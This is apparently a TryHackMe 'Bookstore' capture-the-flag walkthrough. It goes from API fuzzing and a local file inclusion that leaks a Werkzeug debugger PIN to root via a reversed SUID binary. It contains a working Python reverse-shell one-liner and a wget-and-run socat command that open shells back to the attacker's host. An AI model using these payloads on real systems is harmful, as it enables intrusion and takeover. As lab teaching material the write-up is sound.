# Bookstore

## Introduction

Welcome to my another writeup! In this TryHackMe [Bookstore](https://tryhackme.com/room/bookstoreoc) room, you'll learn: directory enumeration, REST API fuzzing, reversing 64-bit LSB executable, and more! Without further ado, let's dive in.

## Background

> A Beginner level box with basic web enumeration and REST API Fuzzing.

> Difficulty: Medium

```
Bookstore is a boot2root CTF machine that teaches a beginner penetration tester basic web enumeration and REST API Fuzzing. Several hints can be found when enumerating the services, the idea is to understand how a vulnerable API can be exploited, you can contact me on twitter @siddhantc_ for giving any feedback regarding the machine.
```

- Overall difficulty for me: Medium
   - Initial foothold: Easy
   - Privilege escalation: Medium

## Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Bookstore]
└─# export RHOSTS=10.10.116.175

┌──(root🌸siunam)-[~/ctf/thm/ctf/Bookstore]
└─# rustscan --ulimit 5000 -t 2000 --range=1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 440e60ab1e865b442851db3f9b122177 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCs5RybjdxaxapwkXwbzqZqONeX4X8rYtfTsy7wey7ZeRNsl36qQWhTrurBWWnYPO7wn2nEQ7Iz0+tmvSI3hms3eIEufCC/2FEftezKhtP1s4/qjp8UmRdaewMW2zYg+UDmn9QYmRfbBH80CLQvBwlsibEi3aLvhi/YrNCzL5yxMFQNWHIEMIry/FK1aSbMj7DEXTRnk5R3CYg3/OX1k3ssy7GlXAcvt5QyfmQQKfwpOG7UM9M8mXDCMiTGlvgx6dJkbG0XI81ho2yMlcDEZ/AsXaDPAKbH+RW5FsC5R1ft9PhRnaIkUoPwCLKl8Tp6YFSPcANVFYwTxtdUReU3QaF9
|   256 592f70769f65abdc0c7dc1a2a34de640 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCbhAKUo1OeBOX5j9stuJkgBBmhTJ+zWZIRZyNDaSCxG6U817W85c9TV1oWw/A0TosCyr73Mn73BiyGAxis6lNQ=
|   256 109f0bddd64dc77a3dff52421d296eba (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAr3xDLg8D5BpJSRh8OgBRPhvxNSPERedYUTJkjDs/jc
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Book Store
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 834559878C5590337027E6EB7D966AEE
5000/tcp open  http    syn-ack ttl 63 Werkzeug httpd 0.14.1 (Python 3.6.9)
|_http-title: Home
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET
|_http-server-header: Werkzeug/0.14.1 Python/3.6.9
| http-robots.txt: 1 disallowed entry 
|_/api </p> 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

According to `rustscan` result, we have 3 ports are opened:

Open Ports        | Service
------------------|------------------------
22                | OpenSSH 7.6p1 Ubuntu
80                | Apache 2.4.29 ((Ubuntu))
5000              | Werkzeug 0.14.1 (Python 3.6.9)

### HTTP on Port 80

**Adding a new domain to `/etc/hosts`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Bookstore]
└─# echo "$RHOSTS bookstore.thm" >> /etc/hosts
```

**In the home page, we can see there is a login page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Bookstore/images/a1.png)

**`login.html`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Bookstore/images/a2.png)

**View-source:**
```html
<!--Still Working on this page will add the backend support soon, also the debugger pin is inside sid's bash history file -->
```

**Let's enumerate hidden directories via `gobuster`!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Bookstore]
└─# gobuster dir -u http://bookstore.thm/ -w /usr/share/wordlists/dirb/big.txt -t 100 
[...]
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/assets               (Status: 301) [Size: 315] [--> http://bookstore.thm/assets/]
/favicon.ico          (Status: 200) [Size: 15406]
/images               (Status: 301) [Size: 315] [--> http://bookstore.thm/images/]
/javascript           (Status: 301) [Size: 319] [--> http://bookstore.thm/javascript/]
/server-status        (Status: 403) [Size: 278]
```

**`/assets/`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Bookstore/images/a3.png)

**The `js` directory sometimes will contain some juicy information:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Bookstore/images/a4.png)

**After checking other legit thrid-part JavaScript library, the `api.js` stood out:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Bookstore/images/a5.png)

**`/assets/js/api.js`:**
```js
function getAPIURL() {
var str = window.location.hostname;
str = str + ":5000"
return str;

    }


async function getUsers() {
    var u=getAPIURL();
    let url = 'http://' + u + '/api/v2/resources/books/random4';
    try {
        let res = await fetch(url);
	return await res.json();
    } catch (error) {
        console.log(error);
    }
}

async function renderUsers() {
    let users = await getUsers();
    let html = '';
    users.forEach(user => {
        let htmlSegment = `<div class="user">
	 	        <h2>Title : ${user.title}</h3> <br>
                        <h3>First Sentence : </h3> <br>
			<h4>${user.first_sentence}</h4><br>
                        <h1>Author: ${user.author} </h1> <br> <br>        
                </div>`;

        html += htmlSegment;
   });
   
    let container = document.getElementById("respons");
    container.innerHTML = html;
}
renderUsers();
//the previous version of the api had a paramter which lead to local file inclusion vulnerability, glad we now have the new version which is secure.
```

**After reading this `api.js` file, we understand:**

- The API URL is at `bookstore.thm:5000`
- We can get some data at `http://bookstore.thm:5000/api/v2/resources/books/random4` in JSON format
- The previous API version has a LFI (Local File Inclusion) vulnerability

Let's go to their API port!

### HTTP on Port 5000

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Bookstore/images/a6.png)

**`gobuster`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Bookstore]
└─# gobuster dir -u http://bookstore.thm:5000/ -w /usr/share/wordlists/dirb/big.txt -t 100
[...]
/api                  (Status: 200) [Size: 825]
/console              (Status: 200) [Size: 1985]
```

**`/console`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Bookstore/images/a7.png)

This is the **Werkzeug Debugger console**, but it requires a PIN to interact with it...

**robots.txt**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Bookstore]
└─# curl http://bookstore.thm:5000/robots.txt
<p>User-agent: *<br><br>
Disallow: /api </p>
```

**`/api`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Bookstore/images/a8.png)

**API routes:**
```
/api/v2/resources/books/all (Retrieve all books and get the output in a json format)
/api/v2/resources/books/random4 (Retrieve 4 random records)
/api/v2/resources/books?id=1(Search by a specific parameter , id parameter)
/api/v2/resources/books?author=J.K. Rowling (Search by a specific parameter, this query will return all the books with author=J.K. Rowling)
/api/v2/resources/books?published=1993 (This query will return all the books published in the year 1993)
/api/v2/resources/books?author=J.K. Rowling&published=2003 (Search by a combination of 2 or more parameters)
```

## Initial Foothold

Armed with the above information, we can start to fuzz the API!

**Since we see a comment in `http://bookstore.thm/assets/js/api.js`, which reveals a vulnerability in the previous version, we can try to find the old version of it:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Bookstore]
└─# ffuf -w /usr/share/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt -u http://bookstore.thm:5000/api/FUZZ/resources/books/all -t 100 
[...]
v1                      [Status: 200, Size: 17010, Words: 3749, Lines: 486, Duration: 208ms]
v2                      [Status: 200, Size: 17010, Words: 3749, Lines: 486, Duration: 209ms]
```

- Found the old API version: `v1`

**Also, in `http://bookstore.thm/assets/js/api.js`, it said: `the api had a paramter which lead to local file inclusion vulnerability`.**

**Let's fuzz the vulnerable GET parameter via `ffuf`!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Bookstore]
└─# ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://bookstore.thm:5000/api/v1/resources/books?FUZZ=123 -t 100
[...]
author                  [Status: 200, Size: 3, Words: 1, Lines: 2, Duration: 215ms]
id                      [Status: 200, Size: 3, Words: 1, Lines: 2, Duration: 205ms]
published               [Status: 200, Size: 3, Words: 1, Lines: 2, Duration: 206ms]
show                    [Status: 500, Size: 23076, Words: 3277, Lines: 357, Duration: 214ms]
```

Hmm... **The `show` GET parameter looks sussy.**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Bookstore/images/a9.png)

**When we reach to this parameter, it shows us `NameError: name 'filename' is not defined`. I'm guessing it's trying to fetch a file!**

**Let's try `/etc/passwd` for testing:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Bookstore/images/a10.png)

Oh!! We found a LFI vulnerability!

**Let's recall back to a HTML comment in `/login.html`:** 
```html
<!--Still Working on this page will add the backend support soon, also the debugger pin is inside sid's bash history file -->
```

**And we indeed found a user called `sid` in `/etc/passwd`! **
```
sid:x:1000:1000:Sid,,,:/home/sid:/bin/bash
```

**Let's find the debugger pin in his bash history file!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Bookstore/images/a11.png)

**Found it!! Let's go to `http://bookstore.thm:5000/console` to unlock the Werkzeug Debugger console!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Bookstore/images/a12.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Bookstore/images/a13.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Bookstore/images/a14.png)

**We'in! Let's get a python reverse shell!**

**To do so, I'll:**

- Setup a `nc` listener:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Bookstore]
└─# nc -lnvp 443
listening on [any] 443 ...
```

- Send a python reverse shell: (Generated from [revshell.com](https://www.revshells.com/))

```py
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.0.253",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Bookstore/images/a15.png)

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Bookstore]
└─# nc -lnvp 443
listening on [any] 443 ...
connect to [10.9.0.253] from (UNKNOWN) [10.10.116.175] 55006
sid@bookstore:~$ whoami;hostname;id;ip a
whoami;hostname;id;ip a
sid
bookstore
uid=1000(sid) gid=1000(sid) groups=1000(sid)
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:5f:3c:06:69:8b brd ff:ff:ff:ff:ff:ff
    inet 10.10.116.175/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2645sec preferred_lft 2645sec
    inet6 fe80::5f:3cff:fe06:698b/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm user `sid`!

**user.txt:**
```
sid@bookstore:~$ cat /home/sid/user.txt
{Redacted}
```

**Stable shell via `socat`:**
```
┌──(root🌸siunam)-[/opt/static-binaries/binaries/linux/x86_64]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

sid@bookstore:~$ wget http://10.9.0.253/socat -O /tmp/socat;chmod +x /tmp/socat;/tmp/socat TCP:10.9.0.253:4444 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane

┌──(root🌸siunam)-[~/ctf/thm/ctf/Bookstore]
└─# socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:4444
2022/10/22 03:28:20 socat[38546] N opening character device "/dev/pts/2" for reading and writing
2022/10/22 03:28:20 socat[38546] N listening on AF=2 0.0.0.0:4444
                                                                 2022/10/22 03:28:34 socat[38546] N accepting connection from AF=2 10.10.116.175:42772 on AF=2 10.9.0.253:4444
                                                                   2022/10/22 03:28:34 socat[38546] N starting data transfer loop with FDs [5,5] and [7,7]
                                               sid@bookstore:~$ 
sid@bookstore:~$ stty rows 22 columns 107
sid@bookstore:~$ export TERM=xterm-256color
sid@bookstore:~$ ^C
sid@bookstore:~$ 
```

## Privilege Escalation

### sid to root

**In user `sid` home directory, we have something interesting:**
```
sid@bookstore:~$ ls -lah
[...]
-rw-rw-r-- 1 sid  sid   16K Oct 19  2020 books.db
[...]
-rwsrwsr-x 1 root sid  8.3K Oct 20  2020 try-harder
[...]
```

**Let's look at the `books.db` first!**
```
sid@bookstore:~$ file books.db 
books.db: SQLite 3.x database, last written using SQLite version 3033000
```

**We can open it via `sqlite3`!**
```
sid@bookstore:~$ sqlite3 books.db 

Command 'sqlite3' not found, but can be installed with:

apt install sqlite3
Please ask your administrator.
```

**Nevermind, let's transfer this SQLite database file to our attacker machine!**
```
sid@bookstore:~$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

┌──(root🌸siunam)-[~/ctf/thm/ctf/Bookstore]
└─# wget http://$RHOSTS:8000/books.db
```

**Enumerate the `books.db` database:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Bookstore]
└─# sqlite3 books.db 
SQLite version 3.39.4 2022-09-29 15:55:41
Enter ".help" for usage hints.
sqlite> 
```

```
sqlite> .tables
books
```

- Found table: `books`

```
sqlite> PRAGMA table_info(books);
0|id||0||1
1|published|INT|0||0
2|author|VARCHAR|0||0
3|title|VARCHAR|0||0
4|first_sentence|VARCHAR|0||0
```

- Found columns: `id`, `published`, `author`, `title`, `first_sentence`.

Hmm... Nothing interesting, I thought it has some credentails in there.

**How about the `try-harder` file?**
```
sid@bookstore:~$ file try-harder 
try-harder: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=4a284afaae26d9772bb38113f55cd53608b4a29e, not stripped

sid@bookstore:~$ ls -lah try-harder 
-rwsrwsr-x 1 root sid 8.3K Oct 20  2020 try-harder
```

**It's an 64-bit LSB executable, has SUID sticky bit, and it's owned by `root`! Which we could escalate our privilege to root!**  

**`strings`:**
```
sid@bookstore:~$ strings try-harder
[...]
AWAVI
AUATL
[]A\A]A^A_
What's The Magic Number?!
/bin/bash -p
Incorrect Try Harder
[...]
```

```
sid@bookstore:~$ ./try-harder 
What's The Magic Number?!
1337
Incorrect Try Harder
```

**Looks like it's asking us a magic number, if that number matched, then spawn a bash shell with SUID privilege!**

**Let's transfer this binary to our attacker machine, and reverse engineering it!**
```
sid@bookstore:~$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

┌──(root🌸siunam)-[~/ctf/thm/ctf/Bookstore]
└─# wget http://$RHOSTS:8000/try-harder;chmod +x try-harder
```

**To do so, I'll use `ghidra`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Bookstore]
└─# ghidra
```

**In the `main` function, we can see there an if statement that comparing an integer:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Bookstore/images/a16.png)

```c
void main(void)

{
  long in_FS_OFFSET;
  uint local_1c;
  uint local_18;
  uint local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setuid(0);
  local_18 = 0x5db3;
  puts("What\'s The Magic Number?!");
  __isoc99_scanf(&DAT_001008ee,&local_1c);
  local_14 = local_1c ^ 0x1116 ^ local_18;
  if (local_14 == 0x5dcd21f4) {
    system("/bin/bash -p");
  }
  else {
    puts("Incorrect Try Harder");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

**Let's break it down:**

- If `local_14` is equal to `0x5dcd21f4` (1573724660), then spawn a bash shell with SUID privilege
- The `local_14` is the value of `local_1c` XOR `0x1116` (0x1116 = 4374) XOR `local_18` (0x5db3 = 23987)
- The `local_1c` is the value of our input (`__isoc99_scanf`)

> Note: You can convert hex value to decimal in ghidra.

**Armed with this information, we can write a simple python script to reverse the correct value of `local_1c`:** (XOR is reversible.)
```py
#!/usr/bin/env python3

local_18 = 23987
XOR_value = 4374
local_14 = 1573724660

print(local_14 ^ XOR_value ^ local_18)
```

**Output:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Bookstore]
└─# python3 try-harder.py
{Redacted}
```

**Found the magic number! Let's get a root shell!**
```
sid@bookstore:~$ ./try-harder 
What's The Magic Number?!
{Redacted}

root@bookstore:~# whoami;hostname;id;ip a
root
bookstore
uid=0(root) gid=1000(sid) groups=1000(sid)
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:5f:3c:06:69:8b brd ff:ff:ff:ff:ff:ff
    inet 10.10.116.175/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 3153sec preferred_lft 3153sec
    inet6 fe80::5f:3cff:fe06:698b/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm root! :D

## Rooted

**root.txt:**
```
root@bookstore:~# cat /root/root.txt 
{Redacted}
```

# Conclusion

What we've learned:

1. Directory Enumeration
2. Fuzzing REST API
3. Local File Inclusion (LFI)
4. Reverse Shell in Werkzeug Debugger Console
5. Reverse Engineering 64-Bit LSB Executable